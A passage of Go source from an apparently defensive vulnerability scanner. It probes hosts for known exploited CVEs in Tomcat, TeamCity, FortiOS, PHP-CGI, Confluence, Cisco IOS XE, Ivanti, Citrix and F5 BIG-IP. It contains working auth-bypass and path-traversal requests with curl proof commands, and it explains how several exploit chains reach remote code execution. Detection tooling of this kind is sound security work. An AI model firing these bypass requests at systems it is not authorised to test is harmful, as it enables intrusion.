	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return false
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}

// probeTomcatPartialPUT tests for CVE-2025-24813 (Apache Tomcat partial PUT
// deserialization). It first fingerprints Tomcat via the Server header, then
// sends a 1-byte partial PUT to a random .session path. A 201 Created response
// means the DefaultServlet accepted the partial upload — the server is vulnerable.
// No deserialization is triggered; the temp file is never read back.
func probeTomcatPartialPUT(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Fingerprint: check Server header on root request.
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()
	server := strings.ToLower(resp.Header.Get("Server"))
	isTomcat := strings.Contains(server, "tomcat") || strings.Contains(server, "coyote")
	if !isTomcat {
		// Secondary fingerprint: /manager/html returns 401 on stock Tomcat.
		mReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/manager/html", nil)
		if err != nil {
			return nil
		}
		mResp, err := client.Do(mReq)
		if err != nil {
			return nil
		}
		mResp.Body.Close()
		// Tomcat returns 401 Unauthorized with WWW-Authenticate on /manager/html.
		wwwAuth := strings.ToLower(mResp.Header.Get("WWW-Authenticate"))
		isTomcat = mResp.StatusCode == http.StatusUnauthorized &&
			strings.Contains(wwwAuth, "tomcat")
	}
	if !isTomcat {
		return nil
	}

	// Probe: partial PUT to a random .session filename.
	sessionPath := fmt.Sprintf("/beacon-probe-%d.session", time.Now().UnixNano())
	u := base + sessionPath
	putReq, err := http.NewRequestWithContext(ctx, http.MethodPut, u,
		strings.NewReader("\x00"))
	if err != nil {
		return nil
	}
	putReq.Header.Set("Content-Type", "application/octet-stream")
	putReq.Header.Set("Content-Range", "bytes 0-0/100")
	putResp, err := client.Do(putReq)
	if err != nil {
		return nil
	}
	putResp.Body.Close()
	if putResp.StatusCode != http.StatusCreated {
		return nil
	}

	f := &finding.Finding{
		CheckID:  finding.CheckCVETomcatPartialPUT,
		Module:   "deep",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2025-24813: Apache Tomcat accepts partial PUT on .session path (%s)", asset),
		Description: fmt.Sprintf(
			"%s is running Apache Tomcat and accepted a partial PUT (Content-Range) request to "+
				"a .session path, returning HTTP 201 Created. "+
				"CVE-2025-24813 (CVSS 9.8, KEV) allows an attacker to upload a malicious Java "+
				"serialized object as a partial upload, then trigger deserialization by requesting "+
				"the session ID that matches the uploaded filename. This achieves remote code execution. "+
				"Affects Tomcat 9.0.0.M1–9.0.98, 10.1.0-M1–10.1.34, 11.0.0-M1–11.0.2. "+
				"Upgrade to 9.0.99 / 10.1.35 / 11.0.3 or later and disable partial PUT if not required.",
			asset,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":             u,
			"put_status":      putResp.StatusCode,
			"content_range":   "bytes 0-0/100",
			"server":          resp.Header.Get("Server"),
		},
		ProofCommand: fmt.Sprintf(
			"curl -sk -X PUT '%s' -H 'Content-Range: bytes 0-0/100' -H 'Content-Type: application/octet-stream' -d $'\\x00' -o /dev/null -w '%%{http_code}'",
			u,
		),
		DiscoveredAt: time.Now(),
	}
	return f
}

// probeTeamCityAuthBypass tests for CVE-2024-27198 (JetBrains TeamCity < 2023.11.4,
// CVSS 9.8, KEV). The Spring Security filter chain can be bypassed by appending
// ;.ico to REST API paths. GET /app/rest/server;.ico returns XML with server
// version on vulnerable instances instead of the expected 401 Unauthorized.
func probeTeamCityAuthBypass(ctx context.Context, client *http.Client, base, asset string) []finding.Finding {
	// Step 1: fingerprint TeamCity via the login page.
	loginReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/login.html", nil)
	if err != nil {
		return nil
	}
	loginResp, err := client.Do(loginReq)
	if err != nil {
		return nil
	}
	loginBody, _ := io.ReadAll(io.LimitReader(loginResp.Body, 4096))
	loginResp.Body.Close()
	if !strings.Contains(strings.ToLower(string(loginBody)), "teamcity") {
		return nil
	}

	var out []finding.Finding

	// CVE-2024-27198: Spring Security filter-chain bypass via ;.ico path suffix.
	bypassURL := base + "/app/rest/server;.ico"
	if req, err := http.NewRequestWithContext(ctx, http.MethodGet, bypassURL, nil); err == nil {
		if resp, err := client.Do(req); err == nil {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			resp.Body.Close()
			bodyStr := string(body)
			if resp.StatusCode == http.StatusOK &&
				(strings.Contains(bodyStr, "<version>") || strings.Contains(bodyStr, "version")) {
				out = append(out, finding.Finding{
					CheckID:  finding.CheckCVETeamCityAuthBypass,
					Module:   "surface",
					Scanner:  scannerName,
					Severity: finding.SeverityCritical,
					Title:    fmt.Sprintf("CVE-2024-27198: JetBrains TeamCity auth bypass confirmed on %s", asset),
					Description: fmt.Sprintf(
						"%s is running JetBrains TeamCity with CVE-2024-27198 (CVSS 9.8, KEV) — "+
							"a Spring Security filter-chain bypass via path suffix confusion. "+
							"Appending ;.ico to REST API paths bypasses authentication. "+
							"GET /app/rest/server;.ico returned HTTP 200 with server version XML instead of 401. "+
							"On vulnerable versions (< 2023.11.4) this allows unauthenticated admin user creation. "+
							"Upgrade to TeamCity 2023.11.4 or later immediately.",
						asset,
					),
					Asset: asset,
					Evidence: map[string]any{
						"bypass_url":   bypassURL,
						"body_excerpt": bodyStr[:min(len(bodyStr), 256)],
					},
					ProofCommand: fmt.Sprintf("curl -sk '%s' | grep -i version", bypassURL),
					DiscoveredAt: time.Now(),
				})
			}
		}
	}

	// CVE-2024-27199: alternate directory-traversal bypass via ;/../ in resource paths.
	// Allows reading arbitrary files and bypassing auth on the same affected versions.
	altURL := base + "/res/projectPlugin.html;/../app/rest/server"
	if req, err := http.NewRequestWithContext(ctx, http.MethodGet, altURL, nil); err == nil {
		if resp, err := client.Do(req); err == nil {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			resp.Body.Close()
			bodyStr := string(body)
			if resp.StatusCode == http.StatusOK &&
				(strings.Contains(bodyStr, "<version>") || strings.Contains(bodyStr, "version")) {
				out = append(out, finding.Finding{
					CheckID:  finding.CheckCVETeamCityDirTraversal,
					Module:   "surface",
					Scanner:  scannerName,
					Severity: finding.SeverityHigh,
					Title:    fmt.Sprintf("CVE-2024-27199: JetBrains TeamCity path-traversal auth bypass on %s", asset),
					Description: fmt.Sprintf(
						"%s is running JetBrains TeamCity with CVE-2024-27199 (CVSS 7.3, KEV) — "+
							"a directory-traversal bypass via ;/../ in static resource paths. "+
							"GET /res/projectPlugin.html;/../app/rest/server returned server XML without auth. "+
							"Also allows reading arbitrary files from the TeamCity server filesystem. "+
							"Upgrade to TeamCity 2023.11.4 or later immediately.",
						asset,
					),
					Asset: asset,
					Evidence: map[string]any{
						"bypass_url":   altURL,
						"body_excerpt": bodyStr[:min(len(bodyStr), 256)],
					},
					ProofCommand: fmt.Sprintf("curl -sk '%s' | grep -i version", altURL),
					DiscoveredAt: time.Now(),
				})
			}
		}
	}

	return out
}

// probeFortiOSSSLVPNVersion tests for CVE-2024-21762 (FortiOS SSL VPN < 7.4.3,
// CVSS 9.6, KEV) and CVE-2018-13379 (FortiOS 5.6.3–5.6.7 / 6.0.0–6.0.4 credential
// file read, CVSS 9.8, KEV). GET /remote/info returns JSON with version on FortiOS
// when the SSL VPN blade is enabled. Both CVEs are checked from the same response.
func probeFortiOSSSLVPNVersion(ctx context.Context, client *http.Client, base, asset string) []finding.Finding {
	u := base + "/remote/info"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := string(body)
	// FortiOS /remote/info returns JSON like {"serial":"FGVM...","version":"v7.2.4",...}
	if !strings.Contains(bodyStr, "serial") && !strings.Contains(bodyStr, "version") {
		return nil
	}
	// Parse version — look for "v7.X.Y" or "7.X.Y" pattern.
	ver := parseFortiOSVersion(bodyStr)
	if ver == "" {
		return nil
	}
	ev := map[string]any{
		"url":     u,
		"version": ver,
		"body":    bodyStr[:min(len(bodyStr), 256)],
	}
	proof := fmt.Sprintf("curl -sk '%s'", u)

	var out []finding.Finding

	// CVE-2018-13379: arbitrary file read via SSL VPN portal (CVSS 9.8, KEV).
	// Affects FortiOS 5.6.3–5.6.7 and 6.0.0–6.0.4.
	if isFortiOSCredLeakVulnerable(ver) {
		out = append(out, finding.Finding{
			CheckID:  finding.CheckCVEFortiOSCredLeak,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    fmt.Sprintf("CVE-2018-13379: FortiOS %s SSL VPN credential file read", ver),
			Description: fmt.Sprintf(
				"%s is running FortiOS %s with SSL VPN exposed. CVE-2018-13379 (CVSS 9.8, KEV) "+
					"allows unauthenticated attackers to read arbitrary files from the system, "+
					"including the sslvpn_websession file which contains plaintext credentials. "+
					"Affects FortiOS 5.6.3–5.6.7 and 6.0.0–6.0.4. "+
					"Upgrade to FortiOS 5.6.8+, 6.0.5+, or 6.2.0+ and rotate all VPN credentials.",
				asset, ver,
			),
			Asset:        asset,
			Evidence:     ev,
			ProofCommand: proof,
			DiscoveredAt: time.Now(),
		})
	}

	// CVE-2024-21762: out-of-bounds write in SSL VPN HTTP handler → unauthenticated RCE (CVSS 9.6, KEV).
	// Affects FortiOS 6.x through 7.4.2.
	if isFortiOSSSLVPNVulnerable(ver) {
		out = append(out, finding.Finding{
			CheckID:  finding.CheckCVEFortiOSSSLVPN,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    fmt.Sprintf("CVE-2024-21762: FortiOS %s SSL VPN RCE — version below 7.4.3", ver),
			Description: fmt.Sprintf(
				"%s is running FortiOS %s with SSL VPN exposed. CVE-2024-21762 (CVSS 9.6, KEV) "+
					"is an out-of-bounds write in the SSL VPN HTTP handler allowing unauthenticated RCE. "+
					"Affects FortiOS 6.0–7.4.2 with SSL VPN enabled. "+
					"Upgrade to FortiOS 7.4.3 or later and disable SSL VPN if not required.",
				asset, ver,
			),
			Asset:        asset,
			Evidence:     ev,
			ProofCommand: proof,
			DiscoveredAt: time.Now(),
		})
	}

	return out
}

// isFortiOSCredLeakVulnerable returns true for FortiOS versions affected by
// CVE-2018-13379: 5.6.3–5.6.7 and 6.0.0–6.0.4.
func isFortiOSCredLeakVulnerable(ver string) bool {
	parts := strings.Split(ver, ".")
	if len(parts) < 3 {
		return false
	}
	maj, min, patch := 0, 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	fmt.Sscanf(parts[2], "%d", &patch)
	if maj == 5 && min == 6 && patch >= 3 && patch <= 7 {
		return true
	}
	if maj == 6 && min == 0 && patch <= 4 {
		return true
	}
	return false
}

// parseFortiOSVersion extracts the version string from /remote/info JSON.
func parseFortiOSVersion(body string) string {
	// Look for "version":"v7.2.4" or "version":"7.2.4"
	idx := strings.Index(body, `"version"`)
	if idx == -1 {
		return ""
	}
	rest := body[idx+9:]
	// Skip : and optional whitespace/quotes
	colon := strings.IndexByte(rest, ':')
	if colon == -1 {
		return ""
	}
	rest = strings.TrimSpace(rest[colon+1:])
	rest = strings.Trim(rest, `"v `)
	// Extract up to comma or closing brace
	end := strings.IndexAny(rest, `,"} `)
	if end != -1 {
		rest = rest[:end]
	}
	rest = strings.TrimPrefix(rest, "v")
	return rest
}

// isFortiOSSSLVPNVulnerable returns true for FortiOS versions < 7.4.3.
func isFortiOSSSLVPNVulnerable(ver string) bool {
	parts := strings.Split(ver, ".")
	if len(parts) < 2 {
		return false
	}
	maj, min := 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	// Affected: 6.x, 7.0.x, 7.1.x, 7.2.x, 7.3.x, 7.4.0–7.4.2
	if maj < 7 {
		return true
	}
	if maj == 7 && min < 4 {
		return true
	}
	if maj == 7 && min == 4 {
		patch := 0
		if len(parts) >= 3 {
			fmt.Sscanf(parts[2], "%d", &patch)
		}
		return patch < 3
	}
	return false
}

// probePHPCGIVersion tests for CVE-2024-4577 (PHP CGI argument injection on Windows,
// CVSS 9.8, KEV). GET /?-v on a server running PHP in CGI mode returns the PHP version
// string. Versions < 8.1.29, < 8.2.20, < 8.3.8 are vulnerable.
// The probe is surface-safe: no code execution — only the version flag is passed.
func probePHPCGIVersion(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/?-v"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := string(body)
	// PHP-CGI -v output: "PHP 8.1.28 (cgi-fcgi) ..."
	if !strings.Contains(bodyStr, "PHP ") || !strings.Contains(bodyStr, "cgi") {
		return nil
	}
	ver := parsePHPCGIVersion(bodyStr)
	if ver == "" || !isPHPCGIVulnerable(ver) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEPHPCGIArgInjection,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2024-4577: PHP-CGI %s argument injection on %s", ver, asset),
		Description: fmt.Sprintf(
			"%s is running PHP %s in CGI mode and is vulnerable to CVE-2024-4577 (CVSS 9.8, KEV). "+
				"On Windows with Best-Fit character encoding, the soft hyphen (%%AD) maps to '-', "+
				"allowing injection of PHP-CGI arguments via the URL query string. "+
				"This enables remote code execution by injecting -d auto_prepend_file=php://input. "+
				"Affects PHP < 8.1.29 / < 8.2.20 / < 8.3.8 on Windows. "+
				"Upgrade PHP immediately or disable CGI mode.",
			asset, ver,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":     u,
			"version": ver,
			"body":    bodyStr[:min(len(bodyStr), 256)],
		},
		ProofCommand: fmt.Sprintf("curl -s '%s'", u),
		DiscoveredAt: time.Now(),
	}
}

// parsePHPCGIVersion extracts the version from PHP -v output.
func parsePHPCGIVersion(body string) string {
	// "PHP 8.1.28 (cgi-fcgi)" → "8.1.28"
	idx := strings.Index(body, "PHP ")
	if idx == -1 {
		return ""
	}
	rest := strings.TrimSpace(body[idx+4:])
	end := strings.IndexAny(rest, " (")
	if end != -1 {
		rest = rest[:end]
	}
	return rest
}

// isPHPCGIVulnerable returns true for PHP versions < 8.1.29 / 8.2.20 / 8.3.8.
func isPHPCGIVulnerable(ver string) bool {
	parts := strings.Split(ver, ".")
	if len(parts) < 3 {
		return false
	}
	maj, min, patch := 0, 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	fmt.Sscanf(parts[2], "%d", &patch)
	if maj != 8 {
		return false
	}
	switch min {
	case 1:
		return patch < 29
	case 2:
		return patch < 20
	case 3:
		return patch < 8
	}
	return false
}

// probeConfluenceSetup tests for CVE-2023-22515 (Confluence broken access control, CVSS 10.0, KEV).
// A GET to /server-info.action with the setupComplete=false parameter returns HTTP 200 on vulnerable
// Confluence 8.0–8.5.1 instances, allowing an attacker to re-enable the setup wizard and create
// an admin account. Patched instances redirect to the login page.
func probeConfluenceSetup(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// First fingerprint Confluence presence.
	fingerReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base, nil)
	if err != nil {
		return nil
	}
	fingerResp, err := client.Do(fingerReq)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(fingerResp.Body, 4096))
	fingerResp.Body.Close()
	bodyStr := strings.ToLower(string(body))
	isConfluence := strings.Contains(bodyStr, "confluence") ||
		fingerResp.Header.Get("X-Confluence-Request-Time") != "" ||
		strings.Contains(bodyStr, "ajs-product-name")
	if !isConfluence {
		return nil
	}

	u := base + "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := strings.ToLower(string(b))
	if !strings.Contains(bStr, "setup") && !strings.Contains(bStr, "administrator") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEConfluenceSetup,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-22515: Confluence setup wizard accessible on %s", asset),
		Description: "The Confluence /server-info.action endpoint with setupComplete=false returned HTTP 200, " +
			"indicating the setup wizard can be re-enabled. CVE-2023-22515 (CVSS 10.0, KEV, exploited by Storm-0062) " +
			"allows an unauthenticated attacker to create a new administrator account, gaining full control " +
			"of Confluence and all its content. Upgrade to Confluence 8.3.3+, 8.4.3+, or 8.5.2+ immediately.",
		Asset: asset,
		Evidence: map[string]any{
			"url":            u,
			"status":         resp.StatusCode,
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -o /dev/null -w '%%{http_code}' '%s'\n"+
				"# Expected on vulnerable: 200 (setup page loads without auth)",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeConfluenceRestore tests for CVE-2023-22518 (Confluence improper authorization, CVSS 10.0, KEV).
// GET /json/setup-restore.action returns 200 on unpatched Confluence, exposing a page that allows
// unauthenticated database restore — overwriting credentials with attacker-controlled data.
func probeConfluenceRestore(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/json/setup-restore.action"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := strings.ToLower(string(b))
	if !strings.Contains(bStr, "confluence") && !strings.Contains(bStr, "restore") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEConfluenceRestore,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-22518: Confluence restore endpoint accessible on %s", asset),
		Description: "The Confluence /json/setup-restore.action endpoint returned HTTP 200 without authentication. " +
			"CVE-2023-22518 (CVSS 10.0, KEV, exploited by C3RB3R ransomware) allows an unauthenticated attacker to " +
			"initiate a full database restore from a crafted backup file, overwriting credentials and configuration. " +
			"This gives the attacker full administrative control of Confluence. " +
			"Upgrade to patched versions: 7.19.16+, 8.3.4+, 8.4.4+, 8.5.3+, or 8.6.1+.",
		Asset: asset,
		Evidence: map[string]any{
			"url":    u,
			"status": resp.StatusCode,
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -o /dev/null -w '%%{http_code}' '%s'\n"+
				"# Expected on vulnerable: 200 (restore page accessible without auth)",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeCiscoIOSXEImplant tests for the BadCandy web implant installed by CVE-2023-20198 exploitation
// (Cisco IOS XE web UI privilege escalation, CVSS 10.0, KEV). The implant installs a Lua-based
// web shell that responds to POST /webui/logoutconfirm.html?logon_hash=1 with an 18-byte hex
// authentication token. Uncompromised devices return 404 or a redirect to login.
func probeCiscoIOSXEImplant(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Fingerprint: Cisco IOS XE web UI has a distinctive login page.
	fingerReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/webui/login", nil)
	if err != nil {
		return nil
	}
	fingerResp, err := client.Do(fingerReq)
	if err != nil {
		return nil
	}
	fb, _ := io.ReadAll(io.LimitReader(fingerResp.Body, 4096))
	fingerResp.Body.Close()
	fbStr := strings.ToLower(string(fb))
	if !strings.Contains(fbStr, "cisco") && !strings.Contains(fbStr, "ios xe") {
		return nil
	}

	u := base + "/webui/logoutconfirm.html?logon_hash=1"
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, u, strings.NewReader(""))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 256))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	// The implant returns exactly an 18-byte lowercase hex string (36 hex chars).
	// Validate the response is hex-only (no HTML, no whitespace).
	body := strings.TrimSpace(string(b))
	if len(body) < 16 || len(body) > 64 {
		return nil
	}
	isHex := true
	for _, c := range body {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			isHex = false
			break
		}
	}
	if !isHex {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVECiscoIOSXEImplant,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-20198: Cisco IOS XE BadCandy implant detected on %s", asset),
		Description: fmt.Sprintf(
			"The Cisco IOS XE device at %s responded to the BadCandy implant probe with a hex token (%s). "+
				"CVE-2023-20198 (CVSS 10.0, KEV) was mass-exploited in October 2023 to install a persistent "+
				"Lua web shell on Cisco IOS XE devices with the HTTP/HTTPS Server feature enabled. "+
				"This device is actively compromised. Engage incident response immediately, "+
				"apply Cisco patches, and follow Cisco Talos remediation guidance.",
			asset, body,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":         u,
			"implant_token": body,
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -X POST '%s'\n"+
				"# Expected on compromised device: 18-byte hex token\n"+
				"# Expected on clean device: 404 or redirect",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeIvantiConnectSecure tests for CVE-2023-46805 (Ivanti Connect Secure path traversal auth
// bypass, CVSS 8.2, KEV) and emits a companion finding for CVE-2024-21887 (command injection via
// authenticated API endpoint, CVSS 9.1, KEV). Both CVEs affect the same product versions and were
// exploited in tandem by nation-state actors (UTA0178) for pre-auth RCE. When auth bypass is
// confirmed, CVE-2024-21887 is practically exploitable — both findings are always emitted together.
func probeIvantiConnectSecure(ctx context.Context, client *http.Client, base, asset string) []finding.Finding {
	// Fingerprint: Ivanti/Pulse Connect Secure login page.
	fingerReq, err := http.NewRequestWithContext(ctx, http.MethodGet,
		base+"/dana-na/auth/url_default/welcome.cgi", nil)
	if err != nil {
		return nil
	}
	fingerResp, err := client.Do(fingerReq)
	if err != nil {
		return nil
	}
	fb, _ := io.ReadAll(io.LimitReader(fingerResp.Body, 4096))
	fingerResp.Body.Close()
	fbStr := strings.ToLower(string(fb))
	if !strings.Contains(fbStr, "ivanti") && !strings.Contains(fbStr, "pulse") {
		return nil
	}

	u := base + "/api/v1/totp/user-backup-code/../../license/keys-status/"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := string(b)
	// Confirm it's JSON license data, not a login redirect body.
	if !strings.Contains(bStr, "{") {
		return nil
	}
	ev := map[string]any{
		"url":  u,
		"body": bStr[:min(len(bStr), 512)],
	}
	proof := fmt.Sprintf(
		"curl -s '%s'\n"+
			"# Expected on vulnerable: JSON license data (auth bypassed)\n"+
			"# Expected on patched: 403 or 404",
		u)
	return []finding.Finding{
		{
			CheckID:  finding.CheckCVEIvantiConnectSecure,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    fmt.Sprintf("CVE-2023-46805: Ivanti Connect Secure auth bypass confirmed on %s", asset),
			Description: "The Ivanti Connect Secure (ICS) path traversal endpoint returned authenticated JSON data " +
				"without credentials. CVE-2023-46805 (CVSS 8.2, KEV) exploits a middleware path-prefix allowlist " +
				"bypass to reach authenticated API endpoints. Apply Ivanti ICS patches immediately.",
			Asset:        asset,
			Evidence:     ev,
			ProofCommand: proof,
			DiscoveredAt: time.Now(),
		},
		{
			CheckID:  finding.CheckCVEIvantiCMDInjection,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    fmt.Sprintf("CVE-2024-21887: Ivanti Connect Secure command injection chain confirmed on %s", asset),
			Description: "CVE-2024-21887 (CVSS 9.1, KEV) is a command injection vulnerability in authenticated " +
				"Ivanti ICS API endpoints (/api/v1/license/keys-status). When chained with CVE-2023-46805 (auth bypass " +
				"confirmed above), an unauthenticated attacker achieves pre-authentication RCE. Nation-state actors " +
				"(UTA0178) actively exploited this chain for espionage campaigns. Apply Ivanti ICS patches immediately " +
				"and audit for GIFTEDVISITOR web shell implants.",
			Asset:        asset,
			Evidence:     ev,
			ProofCommand: proof,
			DiscoveredAt: time.Now(),
		},
	}
}

// probeCitrixBleed tests for CVE-2023-4966 (Citrix NetScaler OIDC memory leak, CVSS 9.4, KEV).
// The /oauth/idp/.well-known/openid-configuration endpoint is specific to NetScaler Gateway
// configured as an OpenID Connect IdP. Surface-mode probe: confirm the endpoint is accessible
// and the X-Citrix-Application header is present, indicating NetScaler exposure.
func probeCitrixBleed(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/oauth/idp/.well-known/openid-configuration"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := string(b)
	// Must be JSON OIDC discovery doc with "issuer" field.
	if !strings.Contains(bStr, `"issuer"`) {
		return nil
	}
	isCitrix := resp.Header.Get("X-Citrix-Application") != "" ||
		strings.Contains(strings.ToLower(bStr), "citrix") ||
		strings.Contains(strings.ToLower(bStr), "netscaler")
	if !isCitrix {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVECitrixBleed,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-4966: Citrix NetScaler OIDC endpoint exposed on %s (Citrix Bleed)", asset),
		Description: "The Citrix NetScaler Gateway OIDC discovery endpoint is publicly accessible. " +
			"CVE-2023-4966 ('Citrix Bleed', CVSS 9.4, KEV) exploits a buffer overread in the nsspe binary: " +
			"sending an oversized Host header causes the response to include adjacent memory containing " +
			"valid AAA session tokens. These tokens can be replayed to bypass MFA and authentication. " +
			"LockBit 3.0 affiliates and others exploited this at scale. " +
			"Upgrade NetScaler to patched versions (14.1-8.50+, 13.1-49.15+, 13.0-92.19+).",
		Asset: asset,
		Evidence: map[string]any{
			"url":              u,
			"x_citrix_header": resp.Header.Get("X-Citrix-Application"),
		},
		ProofCommand: fmt.Sprintf("curl -s -I '%s' | grep -i 'x-citrix\\|content-type'", u),
		DiscoveredAt: time.Now(),
	}
}

// probeF5BigIPAuthBypass tests for CVE-2022-1388 (F5 BIG-IP iControl REST unauthenticated RCE,
// CVSS 9.8, KEV). The /mgmt/shared/echo endpoint, when accessed with a crafted X-F5-Auth-Token
// header and Connection: X-F5-Auth-Token header (exploiting a trusted-header bypass), returns
// JSON on vulnerable BIG-IP. A 200 JSON response without valid credentials confirms the bypass.
func probeF5BigIPAuthBypass(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/mgmt/shared/echo"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	// The bypass uses a hop-by-hop header trick: the BIG-IP iControl trusted-header mechanism
	// forwards X-F5-Auth-Token to the backend if Connection header lists it.
	req.Header.Set("X-F5-Auth-Token", "")
	req.Header.Set("Connection", "X-F5-Auth-Token")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := string(b)
	// BIG-IP /mgmt/shared/echo returns JSON with "stage":"STARTED" or similar.
	if !strings.Contains(bStr, `"stage"`) && !strings.Contains(bStr, `"kind"`) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEF5BigIPAuthBypass,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2022-1388: F5 BIG-IP iControl REST auth bypass confirmed on %s", asset),
		Description: "The F5 BIG-IP iControl REST /mgmt/shared/echo endpoint returned JSON without valid credentials. " +
			"CVE-2022-1388 (CVSS 9.8, KEV) exploits a trusted-header bypass in the iControl REST service: " +
			"the X-F5-Auth-Token header listed in Connection causes the authentication middleware to treat " +
			"the request as pre-authenticated. CISA issued an emergency directive and this was mass-exploited " +
			"within days of disclosure. Apply F5 BIG-IP patches immediately and restrict management access.",
		Asset: asset,
		Evidence: map[string]any{
			"url":  u,
			"body": bStr[:min(len(bStr), 512)],
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -H 'X-F5-Auth-Token: ' -H 'Connection: X-F5-Auth-Token' '%s'\n"+
				"# Expected on vulnerable: JSON response without credentials",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeConfluenceOGNL tests for CVE-2022-26134 (Confluence OGNL injection, CVSS 9.8, KEV).
// The vulnerability allows OGNL injection via the URI path of any Confluence action endpoint.
